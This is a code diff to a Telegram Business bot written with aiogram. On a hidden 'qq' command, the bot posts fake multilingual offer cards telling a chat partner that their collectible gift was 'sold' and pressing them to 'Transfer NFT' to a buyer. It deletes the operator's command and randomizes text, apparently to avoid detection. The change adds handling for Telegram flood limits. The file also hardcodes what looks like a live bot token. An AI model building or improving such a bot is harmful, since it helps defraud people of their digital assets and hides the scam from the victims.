@@ -6,7 +6,6 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.enums import ParseMode
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
@@ -20,6 +19,7 @@ dp = Dispatcher(storage=MemoryStorage())
 message_queue = asyncio.Queue()
 cooldowns = {}          # chat_id -> timestamp последнего запроса
 last_user_messages = {} # chat_id -> message_id последнего сообщения юзера
+client_user_ids = {}    # chat_id (рабочий) -> user_id (личный ID клиента для отправки в ЛС бота)
 
 # Словари локализации для офферов
 LOCALES = {
@@ -34,7 +34,8 @@ LOCALES = {
         "success_sold": "успешно продан!",
         "instruction": "Передайте коллекционный предмет покупателю для зачисления",
         "btn_transfer": "Передать НФТ",
-        "btn_confirm": "Подтвердить передачу"
+        "btn_confirm": "Подтвердить передачу",
+        "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте отправить запрос позже."
     },
     "eng": {
         "offer_text": "offers you",
@@ -47,7 +48,8 @@ LOCALES = {
         "success_sold": "successfully sold!",
         "instruction": "Transfer the collectible item to the buyer to receive",
         "btn_transfer": "Transfer NFT",
-        "btn_confirm": "Confirm transfer"
+        "btn_confirm": "Confirm transfer",
+        "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try sending later."
     },
     "ukr": {
         "offer_text": "пропонує вам",
@@ -60,7 +62,8 @@ LOCALES = {
         "success_sold": "успішно продано!",
         "instruction": "Передайте колекційний предмет покупцю для зарахування",
         "btn_transfer": "Передати НФТ",
-        "btn_confirm": "Підтвердити передачу"
+        "btn_confirm": "Підтвердити передачу",
+        "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте надіслати пізніше."
     },
     "cn": {
         "offer_text": "向您出价",
@@ -73,7 +76,8 @@ LOCALES = {
         "success_sold": "已成功售出！",
         "instruction": "请将收藏品转移给买家以获得",
         "btn_transfer": "转移 NFT",
-        "btn_confirm": "确认转移"
+        "btn_confirm": "确认转移",
+        "flood_error": "⚠️ 暂时限制 (PEER_FLOOD)。请稍后重试。"
     }
 }
 
@@ -107,7 +111,6 @@ def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
     protected_timer = randomize_text(raw_timer)
     protected_lock = randomize_text(raw_lock)
 
-    # Премиум-эмодзи в тексте карточки оффера
     icon_gift = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
     icon_timer = '<tg-emoji emoji-id="5778527486270770928">⏱</tg-emoji>'
     icon_lock = '<tg-emoji emoji-id="5875180111744995604">🔒</tg-emoji>'
@@ -146,7 +149,6 @@ def build_accept_text(gift_name, gift_num, currency_name, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
     
-    # Премиум-эмодзи для текста успешной продажи
     icon_success = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
     icon_info = '<tg-emoji emoji-id="5875180111744995604">ℹ️</tg-emoji>'
 
@@ -178,6 +180,11 @@ def make_accept_keyboard(lang):
         ]
     )
 
+# Обработка личных сообщений с ботом (например, /start)
+@dp.message(F.chat.type == "private")
+async def handle_private_start(message: Message):
+    await message.answer("Бот успешно работает в фоновом режиме для Telegram Business.")
+
 # Перехват команд владельца (формат: qq [ссылка] [сумма] [валюта] [язык])
 @dp.business_message(F.text)
 async def handle_business_command(message: Message):
@@ -190,6 +197,10 @@ async def handle_business_command(message: Message):
 
     chat_id = message.chat.id
     last_user_messages[chat_id] = message.message_id
+    
+    # Сохраняем ID пользователя для отправки личного сообщения в бота при флуде
+    if message.from_user:
+        client_user_ids[chat_id] = message.from_user.id
 
     current_time = time.time()
     if chat_id in cooldowns and current_time - cooldowns[chat_id] < 30:
@@ -299,7 +310,7 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Фоновый воркер с плавной защитной задержкой (3.0 - 5.0 сек)
+# Фоновый воркер с защитой от PEER_FLOOD
 async def sender_worker():
     while True:
         task = await message_queue.get()
@@ -339,14 +350,34 @@ async def sender_worker():
                     message_ids=[task["cmd_message_id"]]
                 )
 
-        except TelegramRetryAfter as e:
-            wait_time = e.retry_after + 1
-            logging.warning(f"Flood control! Waiting for {wait_time} seconds...")
-            await asyncio.sleep(wait_time)
-            await message_queue.put(task)
-
         except Exception as e:
-            logging.error(f"Worker execution error: {e}")
+            if "PEER_FLOOD" in str(e):
+                logging.warning(f"PEER_FLOOD detected in chat {task['chat_id']}. Deleting command and notifying user in bot private chat.")
+                
+                # Удаляем команду qq из чата
+                try:
+                    if task["bcid"]:
+                        await bot.delete_business_messages(
+                            business_connection_id=task["bcid"],
+                            message_ids=[task["cmd_message_id"]]
+                        )
+                except Exception:
+                    pass
+
+                # Отправляем сообщение в ЛС с самим ботом пользователю
+                target_user_id = client_user_ids.get(task["chat_id"])
+                loc = LOCALES.get(task["lang"], LOCALES["ru"])
+                if target_user_id:
+                    try:
+                        await bot.send_message(
+                            chat_id=target_user_id,
+                            text=loc["flood_error"]
+                        )
+                    except Exception:
+                        pass
+            else:
+                logging.error(f"Worker execution error: {e}")
+
         finally:
             message_queue.task_done()
 
@@ -354,7 +385,7 @@ async def main():
     asyncio.create_task(sender_worker())
     await dp.start_polling(
         bot, 
-        allowed_updates=["callback_query", "business_connection", "business_message"]
+        allowed_updates=["callback_query", "business_connection", "business_message", "message"]
     )
 
 if __name__ == "__main__":
